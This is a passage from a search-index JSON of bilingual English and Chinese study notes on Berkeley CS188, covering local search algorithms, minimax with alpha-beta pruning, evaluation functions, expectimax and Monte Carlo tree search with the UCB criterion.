incorporates various heuristics ha,hb, and hc ranging from the trivial heuristic at the bottom to the exact goal distance at the top:</p> <p></p> <p>\u5f88\u663e\u7136\uff0c\u5728 dominance \u7684\u5ea6\u91cf\u6807\u51c6\u4e0b\uff0c\u6240\u6709\u6ee1\u8db3\u6211\u4eec\u5148\u524d\u8981\u6c42\u7684 heuristics \u90fd\u201c\u4e0d\u5927\u4e8e\u201d exact  \u5373\u6b63\u786e\u7684\u60c5\u51b5\uff0c\u90a3\u4e48\u201c\u8d8a\u5927\u201d\u7684 heuristics \u8d8a\u63a5\u8fd1\u4e8e exact\uff0c\u81ea\u7136\u662f\u6211\u4eec\u8d8a\u60f3\u8981\u7684\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/03-Informed_Search_Astar_and_Heuristics/#search-summary","title":"Search: Summary","text":"<p>Regarding the search problems, they can be solved using a variety of search techniques, including but not limited to the five we study in CS 188: </p> <ul> <li>Breadth-first Search </li> <li>Depth-first Search </li> <li>Uniform Cost Search </li> <li>Greedy Search </li> <li>A* Search</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/03-Informed_Search_Astar_and_Heuristics/#link","title":"link","text":"<ul> <li>cs188-sp24-note03</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/04-Local_Search/","title":"04 Local Search","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/04-Local_Search/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/04-Local_Search/#local-search","title":"Local Search","text":"<p>In the previous note, we wanted to find the goal state, along with the optimal path to get there. But in some problems, we only care about finding the goal state  \u2014 reconstructing the path can be trivial.</p> <p>Local search algorithms allow us to find goal states without worrying about the path to get there.</p> <p></p> <p>The figure above shows the one dimensional plot of an objective function on the state space. For that function we wish to find the state that corresponds to the highest objective value. The basic idea of local search algorithms is that from each state they locally move towards states that have a higher objective value until a maximum (hopefully the global) is reached.  </p> <p>We will be covering four such algorithms, hill-climbing, simulated annealing, local beam search and genetic algorithms</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/04-Local_Search/#hill-climbing-search","title":"Hill-Climbing Search","text":"<p>Definition</p> <p>The hill-climbing search algorithm (or steepest-ascent) moves from the current state towards the neighboring state that increases the objective value the most.</p> pseudocode for hill-climbing<pre><code>function HILL-CLIMBING(problem) returns a state\n    current &lt;- make-node(problem.initial-state)\n    loop do\n        neighbor &lt;- a highest-valued successor of current\n        if neighbor.value \u2264 current.value then\n            return current.state\n        current &lt;- neighbor\n</code></pre> <p>The \u201cgreediness\" of hill-climbing makes it vulnerable to being trapped in local maxima (see figure 4.1), as locally those points appear as global maxima to the algorithm, and plateaus (see figure 4.1). </p> <p>Variants of hill-climbing, like stochastic hill-climbing which selects an action randomly among the possible uphill moves, have been proposed. </p> <p>Another variant, random sideways moves, allows moves that don\u2019t strictly increase the objective, allowing the algorithm to escape \u201cshoulders\".</p> <p>Hill-climbing is incomplete. Random-restart hill-climbing on the other hand, which conducts a number of hill-climbing searches from randomly chosen initial states, is trivially complete as at some point a randomly chosen initial state can converge to the global maximum.</p> <p>Summary</p> <p>\u7b80\u5355\u6765\u8bf4\uff0chill-climbing \u59cb\u7ec8\u5411\u7740\u76ee\u524d\u4e0a\u5347\u503e\u5411\u6700\u5927\u7684\u65b9\u5411\uff1bsotchastic hill-climbing \u5728\u4e0a\u5347\u7684\u65b9\u5411\u4e2d\u968f\u673a\u9009\u53d6\u4e00\u4e2a\u65b9\u5411\uff1brandom sideways moves \u5219\u4e0d\u518d\u62d8\u6ce5\u4e8e\u4e0a\u5347\uff1bRandom-restart hill-climbing \u9009\u62e9\u4e86\u968f\u673a\u9009\u53d6\u591a\u4e2a\u8d77\u70b9\u6267\u884c hill-climbing \u7b97\u6cd5\uff0c\u9664\u53bb\u5c11\u6570\u6781\u7aef\u60c5\u51b5\uff0c\u603b\u80fd\u591f\u6709\u4e00\u4e2a\u8d77\u70b9\u80fd\u591f\u5230\u8fbe\u671f\u671b\u7684\u7ec8\u70b9\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/04-Local_Search/#simulated-annealing-search","title":"Simulated Annealing Search","text":"<p>Simulated annealing aims to combine random walk (randomly moves to nearby states) and hill-climbing to obtain a complete and efficient search algorithm. In simulated annealing we allow moves to states that can decrease the objective. </p> <p>The algorithm chooses a random move at each timestep. If the move leads to higher objective value, it is always accepted. If it leads to a smaller objective value, then the move is accepted with some probability . This probability is determined by the temperature parameter, which initially is high (more \u201cbad\" moves allowed) and gets decreased according to some \u201cschedule\". </p> <p>Theoretically, if temperature is decreased slowly enough, the simulated annealing algorithm will reach the global maximum with probability approaching 1. </p> pseudocode for simulated annealing<pre><code>function SIMULATED-ANNEALING(problem, schedule) returns a state\n    current \u2190 problem.initial-state\n    for t = 1 to \u221e do\n        T \u2190 schedule(t)\n        if T = 0 then return current\n        next \u2190 a randomly selected successor of current\n        \u0394E \u2190 next.value - current.value\n        if \u0394E &gt; 0 then\n            current \u2190 next\n        else\n            current \u2190 next only with probability e^(\u0394E/T)\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/note/04-Local_Search/#local-beam-search","title":"Local Beam Search","text":"<p>Local beam search is another variant of the hill-climbing search algorithm. The key difference between the two is that local beam search keeps track of k states (threads) at each iteration. </p> <p>Tip</p> <p>Local Beam \u76f8\u6bd4\u4e8e Hill-Climbing \u5c31\u662f\u201c\u4e0d\u5728\u4e00\u68f5\u6811\u4e0a\u540a\u6b7b\u201d\u7684\u601d\u8def\uff0c\u5176\u540c\u6837\u53ef\u4ee5\u6709 stochastic beam search \u7b49\u53d8\u4f53\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/04-Local_Search/#genetic-algorithms","title":"Genetic Algorithms","text":"<p>Genetic algorithms begin as beam search with k randomly initialized states  called the population. States (called individuals) are represented as a string over a finite alphabet.</p> <p>note04 \u8bb2\u7684\u6bd4\u8f83\u5570\u55e6\uff0c\u4f46\u662f\u6211\u89c9\u5f97\u5148\u5927\u81f4\u770b\u61c2\u4f2a\u4ee3\u7801\uff0c\u518d\u7ed3\u5408\u4e0b\u9762\u7684\u4f8b\u5b50\u5373\u53ef\u3002</p> pseudocode for genetic algorithm<pre><code>function GENETIC-ALGORITHM(population, FITNESS-FN) returns an individual\n    inputs: population, a set of individuals\n            FITNESS-FN, a function that measures the fitness of an individual\n    repeat # \u53cd\u590d\u201c\u7e41\u884d\u3001\u8fdb\u5316\u201d\uff0c\u76f4\u5230\u5b50\u4ee3\u9002\u5e94\u6027\u8db3\u591f\u5f3a\uff0c\u6216\u8005\u65f6\u95f4\u8db3\u591f\u957f\n        new_population \u2190 empty set # \u521d\u59cb\u5316\u65b0\u751f\u4ee3\u4e3a\u7a7a\u96c6\n        for i = 1 to SIZE(population) do # \u4f7f\u5b50\u4ee3\u4e0e\u7236\u4ee3\u6570\u76f8\u540c\n            # \u57fa\u4e8e\u9002\u5e94\u5ea6\u9009\u62e9 x/y\uff0c\u9002\u5e94\u5ea6\u8d8a\u9ad8\uff0c\u9009\u4e2d\u53ef\u80fd\u6027\u8d8a\u5927\n            x \u2190 RANDOM-SELECTION(population, FITNESS-FN) \n            y \u2190 RANDOM-SELECTION(population, FITNESS-FN)\n            child \u2190 REPRODUCE(x, y) # \u201c\u7e41\u80b2\u201d\u5b50\u4ee3\n            if (small random probability) then #\u5c0f\u6982\u7387\u60c5\u51b5\u4e0b \n                child \u2190 MUTATE(child) # \u5b50\u4ee3\u7a81\u53d8\n            add child to new_population # \u5c06\u5b50\u4ee3\u7eb3\u5165\u65b0\u751f\u4ee3\n        population \u2190 new_population # \u6362\u4ee3\n    until some individual is fit enough, or enough time has elapsed\n    return the best individual in population, according to FITNESS-FN\n\nfunction REPRODUCE(x, y) returns an individual\n    inputs: x, y, parent individuals # x/y \u4e3a\u7236\u4ee3\n    n \u2190 LENGTH(x); c \u2190 random number from 1 to n # \u968f\u673a\u53d6\u4e00\u4e2a\u65ad\u70b9 c\uff0c\u4ea4\u6362\u7247\u6bb5\n    return APPEND(SUBSTRING(x, 1, c), SUBSTRING(y, c + 1, n))\n</code></pre> <p>\u4e0a\u56fe\u4e2d\u6620\u7167\u4f2a\u4ee3\u7801\uff0c\u5411\u6211\u4eec\u5c55\u793a\u4e86\u9057\u4f20\u7b97\u6cd5\u662f\u5982\u4f55\u201c\u4f20\u5b97\u63a5\u4ee3\u201d\u7684\uff1b\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 (b) \u4e2d\u6709\u4e24\u5217\u6570\u5b57\uff0c\u7b2c\u4e00\u5217\u8868\u793a\u5176 FITNESS\uff0c\u7b2c\u4e8c\u5217\u8868\u793a\u5176\u9009\u4e2d\u4e3a\u201c\u7236\u4ee3\u201d\u7684\u6982\u7387\uff0c\u8fd9\u4e2a\u6982\u7387\u4e0e FITNESS \u7ebf\u6027\u76f8\u5173\u3002</p> <p>8-Queens problem</p> <p></p> <p></p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/04-Local_Search/#summary","title":"Summary","text":"<p>In this note, we discussed local search algorithms and their motivation. We can use these approaches when we don\u2019t care about the path to some goal state, and want to satisfy constraints or optimize some objective.  Local search approaches allow us to save space and find adequate solutions when working in large state spaces!</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/04-Local_Search/#link","title":"link","text":"<ul> <li>Leetcode =&gt; N-Queens</li> <li>cs188-sp24-note04</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/05-Trees_Minimax_Pruning/","title":"05 Trees Minimax Pruning","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/05-Trees_Minimax_Pruning/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/05-Trees_Minimax_Pruning/#games","title":"Games","text":"<p>In the notes before, our agents could determine the best possible plan and then simply execute it to arrive at a goal. </p> <p>Now, let\u2019s shift gears and consider scenarios where our agents have one or more adversaries who attempt to keep them from reaching their goal(s).</p> <p>We\u2019ll need to run a new class of algorithms that yield solutions to adversarial search problems, more commonly known as games.</p> <p>There are many different types of games. Games can have actions with either deterministic or stochastic (probabilistic) outcomes, can have any variable number of players, and may or may not be zero-sum<sup>1</sup>.</p> <p>The first class of games we\u2019ll cover are deterministic zero-sum games, games where actions are deterministic and our gain is directly equivalent to our opponent\u2019s loss and vice versa.</p> Example <p>The easiest way to think about such games is as being defined by a single variable value, which one team or agent tries to maximize and the opposing team or agent tries to minimize, effectively putting them in direct competition. In Pacman, this variable is your score, which you try to maximize by eating pellets quickly and efficiently while ghosts try to minimize by eating you first. Many common household games also fall under this class of games:</p> <ul> <li>Checkers</li> <li>Chess</li> <li>Go</li> </ul> <p>As opposed to normal search, which returned a comprehensive plan, adversarial search returns a strategy, or policy, which simply recommends the best possible move  given some configuration of our agent(s) and their adversaries.</p> <p>Note</p> <p>The standard game formulation consists of the following definitions: </p> <ul> <li>Initial state, s0</li> <li>Players, Players(s) denote whose turn is </li> <li>Actions, Actions(s) available actions for the player </li> <li>Transition model Result(s,a) </li> <li>Terminal test, Terminal\u2212test(s) </li> <li>Terminal values, Utility(s, player)</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/05-Trees_Minimax_Pruning/#minimax","title":"Minimax","text":"<p>Definition</p> <p>The first zero-sum-game algorithm we will consider is minimax, which runs under the motivating assumption that the opponent we face behaves optimally, and will always perform the move that is worst for us .</p> <p>To introduce this algorithm, we must first formalize the notion of terminal utilities and state value. The value of a state is the optimal score attainable by the agent which controls that state.</p> <ul> <li>A state\u2019s value is defined as the best possible outcome (utility)  an agent can achieve from that state<sup>2</sup>.</li> <li>The value of a terminal state, called a terminal utility, is always some deterministic known value and an inherent game property .</li> <li>In this example, the value of a non-terminal state is defined as the maximum of the values of its children.</li> </ul> <p>Note</p> <p>Defining V(s) as the function defining the value of a state s, we can summarize the above discussion:</p> \\[ V(s) = \\begin{cases} \\max\\limits_{s' \\in \\text{successors}(s)} V(s'), &amp; \\text{if } s \\text{ is a non-terminal state} \\\\ \\text{\\quad \\quad known}, &amp; \\text{if } s \\text{ is a terminal state} \\end{cases} \\] <p>Case 1</p> <p>Assume that Pacman starts with 10 points and loses 1 point per move until he eats the pellet, at which point the game arrives at a terminal state and ends. </p> <p></p> <p>We can start building a game tree for this board as follows, where children of a state are successor states just as in search trees for normal search problems:</p> <p></p> <p>Since the value of the root node\u2019s direct right child will be 8, and the root node\u2019s direct left child will be 6, it follows that by running such computation, an agent can determine that it\u2019s optimal to move right.</p> <p>Case 2</p> <p>Let\u2019s now introduce a new game board with an adversarial ghost that wants to keep Pacman from eating the pellet.</p> <p></p> <p>The rules of the game dictate that the two agents take turns making moves, leading to a game tree where the two agents switch off on layers of the tree that they \"control\". Here\u2019s the game tree that arises from the new two-agent game board above:</p> <p></p> <p>Blue nodes correspond to nodes that Pacman controls and can decide what action to take, while red nodes correspond to ghost-controlled nodes.</p> <p>Naturally, adding ghost-controlled nodes changes the move Pacman believes to be optimal, and the new optimal move is determined with the minimax algorithm. Instead of maximizing the utility over children at every level of the tree, the minimax algorithm only maximizes over the children of nodes controlled by Pacman, while minimizing over the children of nodes controlled by ghosts. </p> <p>Example</p> <p>For simplicity purposes, let\u2019s truncate this game tree to a depth-2 tree, and assign spoofed values to terminal states as follows:</p> <p></p> <p>Hence, the two ghost nodes above have values of min(\u22128,\u22125) = \u22128 and min(\u221210,+8) = \u221210 respectively. Correspondingly, the root node controlled by Pacman has a value of max(\u22128,\u221210) = \u22128. </p> <p>Since Pacman wants to maximize his score, he\u2019ll go left and take the score of \u22128 rather than trying to go for the pellet and scoring \u221210.</p> <p>In order to act optimally, Pacman is forced to hedge his bets and counterintuitively move away from the pellet to minimize the magnitude of his defeat.</p> <p>Note</p> <p>We can summarize the way minimax assigns values to states as follows:</p> <p>$$V(s) = </p> <p>\\begin{cases}  \\max \\limits_{s' \\in \\text{successors}(s)} V(s') &amp; \\text{if } s \\text{ is an agent-controlled state} \\  \\min \\limits_{s' \\in \\text{successors}(s)} V(s') &amp; \\text{if } s \\text{ is an opponent-controlled state} \\  \\text{\\quad \\quad known} &amp; \\text{if } s \\text{ is a terminal state}  \\end{cases}$$</p> <p>In implementation, minimax behaves similarly to depth-first search, computing values of nodes in the same order as DFS would, starting with the the leftmost terminal node and iteratively working its way rightwards. More precisely, it performs a postorder traversal of the game tree. </p> <p>The resulting pseudocode for minimax is both elegant and intuitively simple, and is presented below. Note that minimax will return an action, which corresponds to the root node\u2019s branch to the child it has taken its value from.</p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/05-Trees_Minimax_Pruning/#alpha-beta-pruning","title":"Alpha-Beta Pruning","text":"<p>Minimax seems just about perfect - it\u2019s simple, it\u2019s optimal, and it\u2019s intuitive. Yet, its execution is very similar to depth-first search and it\u2019s time complexity is identical, a dismal O(b m). </p> <p>Recalling that b is the branching factor and m is the approximate tree depth at which terminal nodes can be found, this yields far too great a runtime for many games. For example, chess has a branching factor b \u2248 35 and tree depth m \u2248 100. </p> <p>To help mitigate this issue, minimax has an optimization - alpha-beta pruning.</p> <p>Definition</p> <p>Conceptually, alpha-beta pruning is this: if you\u2019re trying to determine the value of a node n by looking at its successors, stop looking as soon as you know that n\u2019s value can at best equal the optimal value of n\u2019s parent.</p> <p>Consider the following game tree, with square nodes corresponding to terminal states, downward-pointing triangles corresponding to minimizing nodes, and upward-pointing triangles corresponding to maximizer nodes:</p> <p></p> <p>Tip</p> <p>\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1a\u65b9\u5f62\u503c\u4e3a\u65e2\u5b9a\u503c\uff0c\u4e0b\u4e09\u89d2\uff08\u59d1\u4e14\u5141\u8bb8\u6211\u8fd9\u4e48\u79f0\u547c\u201cdownward-pointing triangles\u201d\uff09\u201c\u5411\u4e0b\u201d\u53d6\u5176\u5b50\u4ee3\u503c\uff0c\u4e0a\u4e09\u89d2\u5219\u201c\u5411\u4e0a\u201d\u5374\u5b50\u4ee3\u503c\u3002</p> <p>\uff08\u5047\u4f7f\u6211\u4eec\u79f0\u6df1\u5ea6\u4e3a n \u7684\u8282\u70b9\u4e3a \u201cn \u4ee3\u201d\uff0c\u7b2c m \u4e2a\u5b50\u4ee3\u4e3a\u201cm \u53f7\u201d\uff0c\u5176\u503c\u4e3a \\(V_{nm}\\)\uff09</p> <p>\u53ef\u4ee5\u53d1\u73b0\uff1a\u9996\u5148\uff0c\u6211\u4eec\u83b7\u5f97\u4e86 1 \u4ee3 1 \u53f7\u7684 \u201c3\u201d \uff1b\u7136\u540e\u6211\u4eec\u5728\u5c1d\u8bd5\u83b7\u53d6 1 \u4ee3 2 \u53f7\u65f6\uff0c\u5148\u770b\u5230\u4e86 2 \u4ee3 4 \u53f7\u7684 \u201c2\u201d\uff0c\u8fd9\u8bf4\u660e \\(V_{12} \\leq 2 &lt; V_{11}\\)\uff1b\u6362\u8a00\u4e4b\uff0c\u65e0\u8bba 1 \u4ee3 2 \u53f7\u7684\u5176\u4f59\u5b50\u4ee3\u662f\u4ec0\u4e48\uff0c\u4ed6\u90fd\u65e0\u6cd5\u5f71\u54cd\u5230 0 \u4ee3\uff1b\u6545\u201c\u526a\u679d\u201d\u3002</p> <p></p> <p>Implementing such pruning can reduce our runtime to as good as \\(O(b^{m/2} )\\), effectively doubling our \"solvable\" depth. This pruning is exactly what the minimax algorithm with alpha-beta pruning does, and is implemented as follows:</p> <p></p> <p>Extra</p> <p>note05 \u8ba9\u6211\u4eec \"Take some time to compare this with the pseudocode for vanilla minimax\"\u3002</p> <p>\u55ef\uff1f\u201c\u9999\u8349\u201d\uff1f\u8fd8\u53bb\u641c\u4e86\u4e0b \"vanilla minimax\" \u662f\u4ec0\u4e48\u2026\u2026</p> <p>\u67e5\u725b\u6d25\u5b57\u5178\u5f97\u77e5\u5176\u8fd8\u6709 \"ordinary; not special in any way\" \u4e4b\u610f\uff1b\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u524d\u9762\u4e0d\u526a\u679d\u7684\u5c31\u662f vanilla minimax \u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/05-Trees_Minimax_Pruning/#evaluation-functions","title":"Evaluation Functions","text":"<p>Though alpha-beta pruning can help increase the depth for which we can feasibly run minimax, this still usually isn\u2019t even close to good enough to get to the bottom of search trees for a large majority of games. As a result, we turn to evaluation functions, functions that take in a state and output an estimate of the true minimax value of that node. Typically, this is plainly interpreted as \"better\" states being assigned higher values by a good evaluation function than \"worse\" states. Evaluation functions are widely employed in depth-limited minimax, where we treat non-terminal nodes located at our maximum solvable depth as terminal nodes, giving them mock terminal utilities as determined by a carefully selected evaluation function. Because evaluation functions can only yield estimates of the values of non-terminal utilities, this removes the guarantee of optimal play when running minimax.</p> <p>Summary</p> <p>\u6709\u4e9b\u60c5\u51b5\u526a\u679d\u540e\u4f9d\u65e7\u96be\u4ee5\u8ba1\u7b97 =&gt; \u5f3a\u884c\u622a\u65ad game tree\uff0c\u5176\u6700\u5e95\u5c42\u7684 non-terminal states \u7531 evaluate function \u8d4b\u4e88\u5176 known \u800c\u53d8\u4e3a terminal states =&gt; \u964d\u4f4e\u4e86\u6811\u7684\u6df1\u5ea6\u548c\u5176\u53ef\u9760\u6027\u3002</p> <p>A lot of thought and experimentation is typically put into the selection of an evaluation function when designing an agent that runs minimax, and the better the evaluation function is, the closer the agent will come to behaving optimally. Additionally, going deeper into the tree before using an evaluation function also tends to give us better results  - burying their computation deeper in the game tree mitigates the compromising of optimality.</p> <p>The most common design for an evaluation function is a linear combination of features: \\(Eval(s) = w_{1} f_{1}(s) +w_{2} f_{2}(s) +...+w_{n} f_{n}(s)\\) <sup>3</sup>.</p> <p>Features are simply some element of a game state that we can extract and assign a numerical value. </p> <p>Example</p> <p>In a game of checkers we might construct an evaluation function with 4 features: number of agent pawns, number of agent kings, number of opponent pawns, and number of opponent kings. We\u2019d then select appropriate weights based loosely on their importance. In our checkers example, it makes most sense to select positive weights for our agent\u2019s pawns/kings and negative weights for our opponents pawns/kings. Furthermore, we might decide that since kings are more valuable pieces in checkers than pawns, the features corresponding to our agent\u2019s/opponent\u2019s kings deserve weights with greater magnitude than the features concerning pawns. Below is a possible evaluation function that conforms to the features and weights we\u2019ve just brainstormed:</p> <p>\\(Eval(s) = 2 \u00b7 agent\\_kings(s) +agent\\_pawns(s)\u22122 \u00b7 opponent\\_kings(s)\u2212opponent\\_pawns(s)\\)</p> <p>As you can tell, evaluation function design can be quite free-form, and don\u2019t necessarily have to be linear functions either. For example nonlinear evaluation functions based on neural networks are very common in Reinforcement Learning applications. The most important thing to keep in mind is that the evaluation function yields higher scores for better positions as frequently as possible. This may require a lot of finetuning and experimenting on the performance of agents using evaluation functions with a multitude of different features and weights.</p> <p>Tip</p> <p>\u56de\u60f3\u4e00\u4e0b\u9ad8\u4e2d\u5b66\u4e60\u7684\u7ebf\u6027\u56de\u5f52\uff1a\u6211\u4eec\u6839\u636e\u5df2\u77e5\u6570\u636e\uff0c\u83b7\u53d6 \\(\\hat{y} = ax+b\\)\uff0c\u7136\u540e\u78b0\u5230\u4e86\u4e00\u4e2a\u524d\u9762\u6240\u4e0d\u77e5\u9053\u7684 x\uff0c\u4ee3\u5165\u5176\u4e2d\uff0c\u6211\u4eec\u4f9d\u65e7\u80fd\u591f\u83b7\u53d6 \\(\\hat{y} \u2248 y\\)\uff0c\u8fd9\u5c31\u662f\u4e00\u4e2a eval(x)\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/05-Trees_Minimax_Pruning/#link","title":"link","text":"<ul> <li>cs188-sp24-note05</li> </ul> <ol> <li> <p>In a zero-sum game, one player's gain is exactly equal to the other player's loss. If one player wins points, the other loses the same amount. The total \"sum\" of gains and losses is zero.\u00a0\u21a9</p> </li> <li> <p>We\u2019ll formalize the concept of utility more concretely later, but for now it\u2019s enough to simply think of an agent\u2019s utility as its score or number of points it attains.\u00a0\u21a9</p> </li> <li> <p>Each \\(f_{i}(s)\\) corresponds to a feature extracted from the input state s, and each feature is assigned a corresponding weight \\(w_{i}\\) .\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/06-Expectimax_Monte_Carlo_Tree_Search/","title":"06 Expectimax Monte Carlo Tree Search","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/06-Expectimax_Monte_Carlo_Tree_Search/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/06-Expectimax_Monte_Carlo_Tree_Search/#expectimax","title":"Expectimax","text":"<p>Because minimax believes it is responding to an optimal opponent, it\u2019s often overly pessimistic in situations where optimal responses to an agent\u2019s actions are not guaranteed. Such situations include scenarios with inherent randomness such as card or dice games or unpredictable opponents that move randomly or suboptimally. This randomness can be represented through a generalization of minimax known as expectimax.</p> <p>Expectimax introduces chance nodes into the game tree, which instead of considering the worst case scenario as minimizer nodes do, considers the average case. More specifically, while minimizers simply compute the minimum utility over their children, chance nodes compute the expected utility or expected value.</p> <p>Note</p> <p>Our rule for determining values of nodes with expectimax is as follows:<sup>1</sup></p> \\[V(s) = \\begin{cases} \\max \\limits_{s' \\in \\text{successors}(s)} V(s') &amp; \\text{if } s \\text{ is an agent-controlled state} \\\\ \\sum \\limits_{s' \\in \\text{successors}(s)} p(s'|s)V(s') &amp; \\text{if } s \\text{ is a chance state} \\\\ \\text{\\quad \\quad known} &amp; \\text{if } s \\text{ is a terminal state} \\end{cases}\\] <p>From this definition, we can see that minimax is simply a special case of expectimax . Minimizer nodes are simply chance nodes that assign a probability of 1 to their lowest-value child and probability 0 to all other children.</p> <p>The pseudocode for expectimax is quite similar to minimax, since we\u2019re replacing minimizing nodes with chance nodes:</p> <p></p> <p>Example</p> <p>Consider the following expectimax tree, where chance nodes are represented by circular nodes instead of the upward/downward facing triangles for maximizers/minimizers.</p> <p>Assume for simplicity that all children of each chance node have a probability of occurrence of 1/3 .</p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/06-Expectimax_Monte_Carlo_Tree_Search/#mixed-layer-types","title":"Mixed Layer Types","text":"<p>Though minimax and expectimax call for alternating maximizer/minimizer nodes and maximizer/chance nodes respectively, many games still don\u2019t follow the exact pattern of alternation that these two algorithms mandate. </p> <p>Even in Pacman, after Pacman moves, there are usually multiple ghosts that take turns making moves, not a single ghost. We can account for this by very fluidly adding layers into our game trees  as necessary. </p> <p>In the Pacman example for a game with four ghosts, this can be done by having a maximizer layer followed by 4 consecutive ghost/minimizer layers before the second Pacman/maximizer layer. </p> <p>In fact, doing so inherently gives rise to cooperation across all minimizers, as they alternatively take turns further minimizing the utility attainable by the maximizer(s). It\u2019s even possible to combine chance node layers with both minimizers and maximizers. </p> <p>If we have a game of Pacman with two ghosts, where one ghost behaves randomly and the other behaves optimally, we could simulate this with alternating groups of maximizerchance-minimizer nodes.</p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/06-Expectimax_Monte_Carlo_Tree_Search/#general-games","title":"General Games","text":"<p>Not all games are zero-sum. Indeed, different agents may have have distinct tasks in a game that don\u2019t directly involve strictly competing with one another. Such games can be set up with trees characterized by multi-agent utilities.</p> <p>Such utilities, rather than being a single value that alternating agents try to minimize or maximize, are represented as tuples with different values within the tuple corresponding to unique utilities for different agents. Each agent then attempts to maximize their own utility at each node they control, ignoring the utilities of other agents .</p> Example <p></p> <p>Help</p> <p>\u6bcf\u5c42 agent \u5bf9\u5e94 utility tuples \u4e2d\u76f8\u540c\u989c\u8272\u7684\u6570\u5b57\uff1b\u5728\u7ecf\u8fc7\u8be5\u5c42\u65f6\uff0c\u5b83\u4eec\u53ea\u8003\u8651\u4e0e\u4ed6\u4eec\u6709\u5173\u7684\u6570\u5b57\uff1b\u5bf9\u4e8e maximizer\uff0c\u65e2\u662f\u53d6\u5176\u6700\u5927\u8005\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/06-Expectimax_Monte_Carlo_Tree_Search/#monte-carlo-tree-search","title":"Monte Carlo Tree Search","text":"<p>For applications with a large branching factor, like playing Go, minimax can no longer be used. For such applications we use the Monte Carlo Tree Search (MCTS) algorithm. </p> <p>MCTS is based on two ideas:</p> <ul> <li>Evaluation by rollouts: From state s play many times using a policy (e.g. random) and count wins/losses.</li> <li>Selective search: explore parts of the tree, without constraints on the horizon, that will improve decision at the root.</li> </ul> <p>In the Go example, from a given state, we play until termination according to a policy multiple times. We record the fraction of wins, which correlates well with the value of the state<sup>2</sup>.</p> Example <p>From the current state we have three different available actions (left, middle and right). We take each action 100 times and we record the percentage of wins for each one.</p> <p></p> <p>After the simulations, we are fairly confident that the right action is the best one. </p> <p>In this scenario, we allocated the same amount of simulations to each alternative action. However, it might become clear after a few simulations that a certain action does not return many wins and thus we might choose to allocate this computational effort in doing more simulations for the other actions.</p> <p></p> <p>An interesting case arises when some actions yield similar percentages of wins but one of them has used much fewer simulations to estimate that percentage, as shown in the next figure. </p> <p></p> <p>In this case the estimate of the action that used fewer simulations will have higher variance and hence we might want to allocate a few more simulations to that action to be more confident about the true percentage of wins.</p> <p>Info</p> <p>The UCB algorithm captures this trade-off between \u201cpromising\" and \u201cuncertain\u2019 actions by using the following criterion at each node n:<sup>3</sup></p> <p>\\(\\(UCB1(n)=\\frac{U(n)}{N(n)}+C\\times\\sqrt{\\frac{\\log N(PARENT(n))}{N(n)}}\\)\\)</p> <p>The first term captures how promising the node is, while the second captures how uncertain we are about that node\u2019s utility. The user-specified parameter C balances the weight we put in the two terms (\u201cexploration\" and \u201cexploitation\") and depends on the application and perhaps the stage of the task (in later stages when we have accumulated many trials, we would probably explore less and exploit more).</p> <p>Help</p> <p>\u6211\u4eec\u6682\u65f6\u4e0d\u5fc5\u7406\u89e3\u8fd9\u4e2a\u516c\u5f0f\u662f\u5982\u4f55\u8ba1\u7b97\u4ee5\u53ca\u4e3a\u4ec0\u4e48\u8fd9\u4e48\u8ba1\u7b97\uff1b\u660e\u767d\u8fd9\u4e2a\u7b97\u6cd5\u5e2e\u52a9\u6211\u4eec\u51b3\u5b9a\u662f\u8981 \"explore new moves (exploration) or use moves that have worked well in the past (exploitation)\" \u5373\u53ef\u3002</p> <p>\u5728\u524d\u671f\u5b66\u4e60\u8fc7\u7a0b\u4e2d\uff0c\u8fd9\u4e9b\u7b97\u6cd5\u90fd\u662f\u201c\u51fd\u6570\u201d\uff0c\u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053\u5176\u201c\u8f93\u5165-\u529f\u80fd-\u8f93\u51fa\u201d\u5c31\u597d\u4e86\u3002</p> <p>The MCTS UCT algorithm uses the UCB criterion in tree search problems. More specifically, it repeats the following three steps multiple times:</p> <ol> <li>The UCB criterion is used to move down the layers of a tree from the root node until an unexpanded leaf node is reached.</li> <li>A new child is added to that leaf, and we run a rollout from that child to determine the number of wins from that node.</li> <li>We update the numbers of wins from the child back up to the root node.</li> </ol> <p>Once the above three steps are sufficiently repeated, we choose the action that leads to the child with the highest N. </p> <p>Note that because UCT inherently explores more promising children a higher number of times, as N \u2192 \u221e, UCT approaches the behavior of a minimax agent.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/06-Expectimax_Monte_Carlo_Tree_Search/#summary","title":"Summary","text":"<p>In this note, we shifted gears from considering standard search problems where we simply attempt to find a path from our starting point to some goal, to considering adversarial search problems where we may have opponents that attempt to hinder us from reaching our goal.</p> <ul> <li>Minimax - Used when our opponent(s) behaves optimally, and can be optimized using \u03b1-\u03b2 pruning. Minimax provides more conservative actions than expectimax, and so tends to yield favorable results when the opponent is unknown as well.</li> <li>Expectimax - Used when we facing a suboptimal opponent(s), using a probability distribution over the moves we believe they will make to compute the expectated value of states.</li> <li>In most cases, it\u2019s too computationally expensive to run the 